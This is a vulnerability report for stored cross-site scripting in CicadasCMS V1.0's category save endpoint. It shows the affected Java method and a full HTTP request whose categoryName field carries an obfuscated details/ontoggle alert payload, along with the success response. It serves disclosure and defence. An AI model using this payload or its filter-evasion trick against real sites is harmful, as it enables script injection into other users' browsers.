CicadasCMS - Cross Site Scripting on (cms/service/impl/CategoryServiceImpl.java categoryName parameter) 

Vendor Homepage:
```
https://gitee.com/westboy/CicadasCMS/branches
```

Version: 

```
V1.0
```

Tested on: 

```
JAVA, Apache, MySQL
```

Affected Page:

```
cms/service/impl/CategoryServiceImpl.java
```

On this page, categoryName parameter is vulnerable to Cross Site Scripting

```
public String save(TCmsCategory pojo) {
        ...
        if(categoryMapper.insert(pojo)>0){
            return JsonUtil.toSUCCESS("分类添加成功！","category-tab",true);
        }
        return JsonUtil.toERROR("分类添加失败！");
    }
```

Request:

```
POST /system/cms/category/save HTTP/1.1
Host: 172.16.78.31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 276
Origin: http://172.16.78.31
Connection: keep-alive
Referer: http://172.16.78.31/system
Cookie: bjui_theme=blue; SESSION=15482c77-518b-4df6-a1d7-e7945a6d70ba
Priority: u=0

categoryId=&categoryName=%3Cdetails+open+ontoggle%3Dtop%5B'ale'%2B'rt'%5D(1)%3E&alias=ddd&parentId=0&translatedCategoryId=0&categoryIcon=&url=&permissionKey=&isNav=0&allowSearch=0&pageSize=3&modelId=79&alone=false&isCommon=false&content=&indexTpl=&listTpl=&contentTpl=&sortId=
```

Response:

```
HTTP/1.1 200 
Content-Type: application/json;charset=UTF-8
Content-Length: 130
Date: Thu, 18 Sep 2025 13:19:37 GMT

{"tabid":"category-tab","forward":"","message":"分类添加成功！","closeCurrent":true,"forwardConfirm":"","statusCode":"200"}
```
